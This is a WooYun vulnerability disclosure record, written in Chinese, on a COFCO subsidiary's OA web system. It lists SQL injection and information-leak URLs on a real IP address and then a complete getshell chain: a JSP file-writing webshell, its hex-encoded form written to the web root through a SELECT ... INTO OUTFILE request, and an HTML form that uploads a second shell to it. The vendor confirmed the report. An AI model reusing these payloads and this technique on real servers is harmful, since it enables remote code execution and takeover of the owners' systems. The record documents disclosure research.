{"id": 76987, "wybug_id": "wooyun-2015-0163536", "wybug_title": "中粮集团有限公司某站信息泄露+sql注射+getshell内网system权限", "wybug_corp": "中粮集团有限公司", "wybug_author": "whynot", "wybug_date": "2015-12-22 15:03", "wybug_open_date": "2016-02-06 10:45", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向公众公开  简要描述： 一个不应该出现的漏洞 详细说明：   WooYun: 中粮集团某分公司OA系统SQL注入/越权访问/getshell  厂商不知道忘了修还是怎么滴 这个前辈可能感觉jsp写入shell有点麻烦 仅仅证明了一下 我折腾的一番 拿到了首先是敏感信息泄露http://60.28.104.133:9060//yyoa/assess/js/initDataAssess.jsphttp://60.28.104.133:9060/yyoa/common/selectPersonNew/initData.jsp?trueName=1\n\n\n\n接着sql注射 我又多出几处 这三个我都跑过了http://60.28.104.133:9060//yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=http://60.28.104.133:9060/yyoa/common/selectPersonNew/initData.jsp?trueName=1http://60.28.104.133:9060/yyoa/common/js/menu/test.jsp?doType=101&S1=select user()\n\n其中http://60.28.104.133:9060/yyoa/common/js/menu/test.jsp?doType=101&S1=select user()这个是最致命的地方 相当于phpmyadmin navicat的功能 可以执行任意语句但是jsp和php asp aspx不太一样 需要很多的语句来写入马 这是最主要的麻烦地方测试了一下 在本地也测试了很久 始终没找到合适的方法 直接写入shell 搜索wooyun案例 get it WooYun: 东方航空传媒公司一个被忽略漏洞引发的血案（可getshell）  这个写文件脚本 做一个小马功能<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.getRealPath(\"\\\\\")+request.getParameter(\"f\"))).write(request.getParameter(\"t\").getBytes());%>16进制防止URL转码http://60.28.104.133:9060/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex%28%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27%29%20into%20outfile%20%27D:/UFIDA/U8-OA/tomcat/webapps/yyoa/haha.jsp%27本地搭建上传菜刀马\n<html>\t<form action=\"http://60.28.104.133:9060/yyoa/haha.jsp?f=ha.jsp\" method=\"post\">\t\t<textarea cols=\"80\" rows=\"20\" name=\"t\" ></textarea>\t\t<input type=\"submit\" name=\"submit\">\t</form></html>\n最终get it  http://60.28.104.133:9060/yyoa/ha.jsp y\n\n\n\n\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  及时打上补丁   版权声明：转载请注明来源 whynot@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-12-23 10:47 厂商回复： 非常感谢，马上整改！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-22 15:38 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:1469 漏洞数:180        | 1000rank目标达成！撒花……)\t\t \n  中粮专业户啊！666    \n     2015-12-22 15:45 |    \t\twhynot \t\t\t( 普通白帽子  |\t\t\t        Rank:573 漏洞数:101        | 为你解冻冰河 为你放弃世界有何不可)\t\t \n  @进击的zjx 趁着厂商给力 嘿嘿    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}